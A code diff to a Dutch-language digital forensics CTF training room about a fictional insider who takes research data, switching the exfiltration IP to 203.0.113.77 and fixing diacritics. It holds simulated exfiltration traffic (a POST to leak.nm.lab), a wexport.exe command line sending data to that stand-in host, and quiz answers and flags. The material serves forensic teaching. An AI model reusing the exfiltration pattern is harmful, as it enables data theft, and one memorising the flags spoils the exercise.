@@ -6,11 +6,11 @@ const PCAP_ZAAK = [
   { no: 2, time: '0.014', src: '10.10.80.1', dst: '10.10.80.5', proto: 'DNS', len: 94, info: 'Antwoord A share.zilverlab.lab = 10.10.50.20' },
   { no: 3, time: '1.210', src: '10.10.80.5', dst: '10.10.50.20', proto: 'SMB', len: 320, info: 'SMB2 Read  \\\\zilverlab\\onderzoek\\prototype.zip' },
   { no: 4, time: '1.260', src: '10.10.50.20', dst: '10.10.80.5', proto: 'SMB', len: 1480, info: 'SMB2 Read Response (bestand gelezen)' },
-  { no: 5, time: '48.300', src: '10.10.80.5', dst: '10.10.90.77', proto: 'DNS', len: 80, info: 'Standaardquery A leak.nm.lab' },
-  { no: 6, time: '48.330', src: '10.10.80.5', dst: '10.10.90.77', proto: 'TCP', len: 74, info: '51210 -> 80 [SYN]' },
-  { no: 7, time: '48.344', src: '10.10.90.77', dst: '10.10.80.5', proto: 'TCP', len: 74, info: '80 -> 51210 [SYN, ACK]' },
+  { no: 5, time: '48.300', src: '10.10.80.5', dst: '203.0.113.77', proto: 'DNS', len: 80, info: 'Standaardquery A leak.nm.lab' },
+  { no: 6, time: '48.330', src: '10.10.80.5', dst: '203.0.113.77', proto: 'TCP', len: 74, info: '51210 -> 80 [SYN]' },
+  { no: 7, time: '48.344', src: '203.0.113.77', dst: '10.10.80.5', proto: 'TCP', len: 74, info: '80 -> 51210 [SYN, ACK]' },
   {
-    no: 8, time: '48.360', src: '10.10.80.5', dst: '10.10.90.77', proto: 'HTTP', len: 5120,
+    no: 8, time: '48.360', src: '10.10.80.5', dst: '203.0.113.77', proto: 'HTTP', len: 5120,
     info: 'POST /drop HTTP/1.1  (data 4.820 bytes!)',
     stream: `POST /drop HTTP/1.1
 Host: leak.nm.lab
@@ -27,8 +27,8 @@ Content-Length: 8
 
 ontvangen`,
   },
-  { no: 9, time: '48.690', src: '10.10.90.77', dst: '10.10.80.5', proto: 'HTTP', len: 190, info: 'HTTP/1.1 200 OK (text/plain)' },
-  { no: 10, time: '48.700', src: '10.10.80.5', dst: '10.10.90.77', proto: 'TCP', len: 66, info: '51210 -> 80 [ACK]' },
+  { no: 9, time: '48.690', src: '203.0.113.77', dst: '10.10.80.5', proto: 'HTTP', len: 190, info: 'HTTP/1.1 200 OK (text/plain)' },
+  { no: 10, time: '48.700', src: '10.10.80.5', dst: '203.0.113.77', proto: 'TCP', len: 66, info: '51210 -> 80 [ACK]' },
   { no: 11, time: '52.900', src: '10.10.80.5', dst: '10.10.50.10', proto: 'HTTP', len: 410, info: 'GET /intranet HTTP/1.1 (normaal verkeer)' },
   { no: 12, time: '53.100', src: '10.10.50.10', dst: '10.10.80.5', proto: 'HTTP', len: 1320, info: 'HTTP/1.1 200 OK (text/html)' },
 ];
@@ -45,10 +45,10 @@ const LOGS_ZAAK = `2026-09-28 08:02:11 WS-DEKKER Security 4624 Logon geslaagd   
 2026-09-28 23:15:33 WS-DEKKER Sysmon   1    ProcessCreate        Image=C:\\Users\\jdekker\\AppData\\Roaming\\wexport.exe  Parent=explorer.exe
 2026-09-28 23:16:10 WS-DEKKER Security 5140 Netwerkshare benaderd  Share=\\\\zilverlab\\onderzoek  Account=j.dekker
 2026-09-28 23:17:02 WS-DEKKER Sysmon   11   FileCreate           Image=wexport.exe  Target=C:\\Users\\jdekker\\AppData\\Roaming\\prototype.zip
-2026-09-28 23:18:52 WS-DEKKER Sysmon   3    NetworkConnect       Image=wexport.exe  Dest=10.10.90.77:80
+2026-09-28 23:18:52 WS-DEKKER Sysmon   3    NetworkConnect       Image=wexport.exe  Dest=203.0.113.77:80
 2026-09-28 23:19:40 WS-DEKKER Security 4634 Logoff              Account=j.dekker
 2026-09-29 07:55:12 WS-DEKKER Security 4624 Logon geslaagd       Account=m.visser   LogonType=2 (Interactief)
-2026-09-29 09:03:00 WS-DEKKER SOC-tag  incident ZILVERLAB: na-werktijd logon j.dekker + share-toegang + upload naar 10.10.90.77 = NM{tijdlijn_rond}`;
+2026-09-29 09:03:00 WS-DEKKER SOC-tag  incident ZILVERLAB: na-werktijd logon j.dekker + share-toegang + upload naar 203.0.113.77 = NM{tijdlijn_rond}`;
 
 CS.registerRoom({
   id: 'forensie-ctf',
@@ -103,8 +103,8 @@ CS.registerRoom({
       questions: [
         { q: 'Wat maakt jouw onderzoek in deze zaak rechtmatig?', options: ['Een geldige machtiging en het werken binnen de grenzen daarvan', 'Dat het bedrijf fictief is', 'Dat je snel werkt', 'Niets, dat hoeft niet'], answer: 0, explain: 'Een machtiging en het respecteren van de bevoegdheid maken het onderzoek rechtmatig; anders is het bewijs onbruikbaar.' },
         { q: 'Op welk account en welke werkplek valt de verdenking?', answer: ['j.dekker', 'jdekker', 'dekker'], hint: 'Lees de opdracht: het account van de verdachte medewerker.', explain: 'De verdenking valt op het account j.dekker op de werkplek WS-DEKKER (10.10.80.5).' },
-        { q: 'Waarom werk je op kopieen en niet op het origineel?', options: ['Om het originele bewijs onaangeroerd en controleerbaar te houden', 'Omdat kopieen sneller zijn', 'Omdat het origineel versleuteld is', 'Dat hoeft niet'], answer: 0, explain: 'Je bewaakt de integriteit en de chain of custody door nooit op het origineel te werken.' },
-        { q: 'Ik heb een machtiging, werk op kopieen en ga de zes stappen van de onderzoekslijn doorlopen.', noAnswer: true },
+        { q: 'Waarom werk je op kopieën en niet op het origineel?', options: ['Om het originele bewijs onaangeroerd en controleerbaar te houden', 'Omdat kopieën sneller zijn', 'Omdat het origineel versleuteld is', 'Dat hoeft niet'], answer: 0, explain: 'Je bewaakt de integriteit en de chain of custody door nooit op het origineel te werken.' },
+        { q: 'Ik heb een machtiging, werk op kopieën en ga de zes stappen van de onderzoekslijn doorlopen.', noAnswer: true },
       ],
     },
 
@@ -222,14 +222,14 @@ CS.registerRoom({
         </ol>
 
         <div class="callout tip">
-          <strong>Tip:</strong> de upload gaat naar het externe IP <code>10.10.90.77</code> (host <code>leak.nm.lab</code>).
+          <strong>Tip:</strong> de upload gaat naar het externe IP <code>203.0.113.77</code> (host <code>leak.nm.lab</code>).
           Kijk ook naar de User-Agent <code>wexport/1.2</code> — dat is geen browser, maar een exfiltratietool. Onthoud
           die naam; je komt hem in de geheugendump en de logs weer tegen.
         </div>
       `,
       lab: { type: 'pcap', title: 'zilverlab-netwerk.pcap', packets: PCAP_ZAAK },
       questions: [
-        { q: 'Naar welk extern IP-adres werd de buit geuploadt?', answer: ['10.10.90.77'], hint: 'Kijk naar de bestemming (dst) van het grote POST-pakket.', explain: 'De POST ging naar 10.10.90.77 (leak.nm.lab), buiten het interne netwerk.' },
+        { q: 'Naar welk extern IP-adres werd de buit geüpload?', answer: ['203.0.113.77'], hint: 'Kijk naar de bestemming (dst) van het grote POST-pakket.', explain: 'De POST ging naar 203.0.113.77 (leak.nm.lab), buiten het interne netwerk.' },
         { q: 'Welke tool deed de upload (lees de User-Agent in de stream)?', answer: ['wexport', 'wexport/1.2', 'wexport.exe'], hint: 'In de HTTP-kop staat User-Agent: ...', explain: 'De User-Agent is wexport/1.2 — geen browser maar een exfiltratietool. Dezelfde naam zie je terug in geheugen en logs.' },
         { q: 'Welke vlag staat in de HTTP-kop van de POST (Follow stream)?', answer: ['NM{buit_onderschept}'], encoded: true, hint: 'Open Follow stream op het grote POST-pakket en lees de X-Case-regel.', explain: 'In de header X-Case staat NM{buit_onderschept}; eronder de binaire ZIP met de gestolen onderzoeksdata.' },
       ],
@@ -245,7 +245,7 @@ CS.registerRoom({
         <h3>Zo pak je het aan</h3>
         <ol>
           <li><strong>Bekijk de processen.</strong> Draai <code>windows.pslist</code>. Tussen de normale processen staat
-          er een die niet thuishoort op een financiele werkplek.</li>
+          er een die niet thuishoort op een financiële werkplek.</li>
           <li><strong>Bekijk de verbindingen.</strong> Draai <code>windows.netscan</code>. Welk proces heeft een
           uitgaande verbinding naar het externe IP uit de vorige taak?</li>
           <li><strong>Lees de opdrachtregel.</strong> Draai <code>windows.cmdline</code>. Het echte pad verraadt dat het
@@ -258,7 +258,7 @@ python3 vol.py -f ws-dekker.raw windows.cmdline</code></pre>
 
         <div class="callout info">
           <strong>Samenhang:</strong> let op hoe het bewijs klopt over de bronnen heen. De tool <code>wexport.exe</code>
-          die je in de pcap als User-Agent zag, draait hier als proces en praat met hetzelfde IP <code>10.10.90.77</code>.
+          die je in de pcap als User-Agent zag, draait hier als proces en praat met hetzelfde IP <code>203.0.113.77</code>.
           Dat is precies wat een sterk forensisch verhaal maakt: meerdere, onafhankelijke bronnen wijzen dezelfde kant op.
         </div>
       `,
@@ -282,21 +282,21 @@ PID    PPID   ImageFileName   Threads  SessionId  CreateTime
 
 Proto  LocalAddr     LocalPort  ForeignAddr   ForeignPort  State        PID    Owner
 TCPv4  10.10.80.5    50140      10.10.1.1     443          ESTABLISHED  2210   OUTLOOK.EXE
-TCPv4  10.10.80.5    51210      10.10.90.77   80           ESTABLISHED  5120   wexport.exe
+TCPv4  10.10.80.5    51210      203.0.113.77   80           ESTABLISHED  5120   wexport.exe
 UDPv4  10.10.80.5    53         *             *            *            636    svchost.exe
 
-(!) wexport.exe (PID 5120) praat met 10.10.90.77:80 — hetzelfde IP als de exfil-upload.`,
+(!) wexport.exe (PID 5120) praat met 203.0.113.77:80 — hetzelfde IP als de exfil-upload.`,
           'python3 vol.py -f ws-dekker.raw windows.cmdline': `Volatility 3 Framework 2.7.0
 
 PID    Process        Args
 2210   OUTLOOK.EXE    "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
 2880   EXCEL.EXE      "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
-5120   wexport.exe    C:\\Users\\jdekker\\AppData\\Roaming\\wexport.exe --dst 10.10.90.77 --tag NM{proces_ontmaskerd}`,
+5120   wexport.exe    C:\\Users\\jdekker\\AppData\\Roaming\\wexport.exe --dst 203.0.113.77 --tag NM{proces_ontmaskerd}`,
         },
       },
       questions: [
         { q: 'Welk proces hoort niet thuis en deed de exfiltratie?', answer: ['wexport.exe', 'wexport'], hint: 'Vergelijk met de bekende Office/systeemprocessen; één valt op en start om 23:15.', explain: 'wexport.exe (PID 5120, kind van explorer.exe) is de exfiltratietool — dezelfde naam als de User-Agent in de pcap.' },
-        { q: 'Met welk extern IP praat dit proces (windows.netscan)?', answer: ['10.10.90.77'], hint: 'Kijk bij de ForeignAddr op de wexport.exe-regel.', explain: 'wexport.exe (PID 5120) verbindt met 10.10.90.77:80 — hetzelfde IP als de upload in de pcap.' },
+        { q: 'Met welk extern IP praat dit proces (windows.netscan)?', answer: ['203.0.113.77'], hint: 'Kijk bij de ForeignAddr op de wexport.exe-regel.', explain: 'wexport.exe (PID 5120) verbindt met 203.0.113.77:80 — hetzelfde IP als de upload in de pcap.' },
         { q: 'Vanuit welke map draait wexport.exe (windows.cmdline)?', answer: ['AppData', 'C:\\Users\\jdekker\\AppData\\Roaming', 'appdata', 'Roaming'], hint: 'Lees het pad in de Args-kolom; het is geen System32.', explain: 'Het draait uit C:\\Users\\jdekker\\AppData\\Roaming — een gebruikersmap, niet System32: verdacht.' },
         { q: 'Welke vlag staat in de opdrachtregel van wexport.exe?', answer: ['NM{proces_ontmaskerd}'], hint: 'Lees de --tag in de Args van windows.cmdline.', explain: 'De argumenten bevatten --tag NM{proces_ontmaskerd}.' },
       ],
@@ -317,7 +317,7 @@ PID    Process        Args
           <li><strong>De keten van acties.</strong> Vlak na die login verschijnen: het starten van
           <code>wexport.exe</code> (Sysmon event <code>1</code>, ProcessCreate), toegang tot de share
           <code>\\\\zilverlab\\onderzoek</code> (event <code>5140</code>), en een netwerkverbinding naar
-          <code>10.10.90.77</code> (Sysmon event <code>3</code>). Dat is het hele verhaal op één tijdlijn.</li>
+          <code>203.0.113.77</code> (Sysmon event <code>3</code>). Dat is het hele verhaal op één tijdlijn.</li>
           <li><strong>De vlag.</strong> Onderaan tagde de SOC-analist het incident. Daarin staat de vlag. Filter desnoods
           op <code>NM</code> of op <code>SOC-tag</code>.</li>
         </ol>
@@ -386,7 +386,7 @@ PID    Process        Args
         <h3>Wat hoort in een forensisch rapport?</h3>
         <ul>
           <li><strong>Feiten, los van interpretatie.</strong> Scheid wat je <em>zag</em> van wat je <em>denkt</em> dat het
-          betekent. Feit: "om 23:18 verbond wexport.exe (PID 5120) met 10.10.90.77". Interpretatie: "dit duidt op
+          betekent. Feit: "om 23:18 verbond wexport.exe (PID 5120) met 203.0.113.77". Interpretatie: "dit duidt op
           exfiltratie van onderzoeksdata door account j.dekker". Een rechter wil die twee gescheiden zien.</li>
           <li><strong>Reproduceerbaarheid.</strong> Vermeld welke tools (met versie) en welke exacte commando's en filters
           je gebruikte. Een onafhankelijke deskundige moet met dezelfde bestanden tot dezelfde conclusie komen. Doet die
@@ -394,7 +394,7 @@ PID    Process        Args
           <li><strong>Chain of custody.</strong> Leg vast wie het bewijs wanneer veiligstelde, met welke machtiging, en
           de hashes (zoals de SHA-256 die je controleerde). Zo toon je aan dat er niet is geknoeid.</li>
           <li><strong>Bronnen die elkaar bevestigen.</strong> Je sterkste bewijs is dat onafhankelijke bronnen (bestand,
-          geheugen, netwerk, logs) dezelfde kant op wijzen: steeds j.dekker, wexport.exe en 10.10.90.77.</li>
+          geheugen, netwerk, logs) dezelfde kant op wijzen: steeds j.dekker, wexport.exe en 203.0.113.77.</li>
         </ul>
 
         <div class="callout info">
@@ -418,8 +418,8 @@ PID    Process        Args
       `,
       questions: [
         { q: 'Wat moet in een forensisch rapport strikt gescheiden blijven?', options: ['Feiten en interpretatie', 'Namen en tijdstippen', 'Tekst en tabellen', 'Nederlands en Engels'], answer: 0, explain: 'Feiten (wat je zag) scheid je van interpretatie (wat het betekent), zodat de rechter zelf kan wegen.' },
-        { q: 'Wat betekent "reproduceerbaar" in dit verband?', options: ['Een ander komt met dezelfde bestanden, tools en commando\'s tot dezelfde conclusie', 'Je kunt het rapport kopieren', 'Het onderzoek was snel', 'Je gebruikte dure software'], answer: 0, explain: 'Reproduceerbaarheid maakt je bevindingen controleerbaar en betrouwbaar; daarom noteer je exact je methode.' },
-        { q: 'Wat maakt het bewijs in deze zaak juist zo sterk?', options: ['Meerdere onafhankelijke bronnen (bestand, geheugen, netwerk, logs) wijzen dezelfde kant op', 'Er is maar één bron', 'Het was snel gevonden', 'De verdachte bekende meteen'], answer: 0, explain: 'Bestand, geheugendump, pcap en logs wijzen allemaal naar j.dekker, wexport.exe en 10.10.90.77 — dat bevestigt elkaar.' },
+        { q: 'Wat betekent "reproduceerbaar" in dit verband?', options: ['Een ander komt met dezelfde bestanden, tools en commando\'s tot dezelfde conclusie', 'Je kunt het rapport kopiëren', 'Het onderzoek was snel', 'Je gebruikte dure software'], answer: 0, explain: 'Reproduceerbaarheid maakt je bevindingen controleerbaar en betrouwbaar; daarom noteer je exact je methode.' },
+        { q: 'Wat maakt het bewijs in deze zaak juist zo sterk?', options: ['Meerdere onafhankelijke bronnen (bestand, geheugen, netwerk, logs) wijzen dezelfde kant op', 'Er is maar één bron', 'Het was snel gevonden', 'De verdachte bekende meteen'], answer: 0, explain: 'Bestand, geheugendump, pcap en logs wijzen allemaal naar j.dekker, wexport.exe en 203.0.113.77 — dat bevestigt elkaar.' },
         { q: 'Ik kan een forensisch rapport opbouwen met feiten, interpretatie, reproduceerbaarheid en chain of custody.', noAnswer: true },
       ],
     },
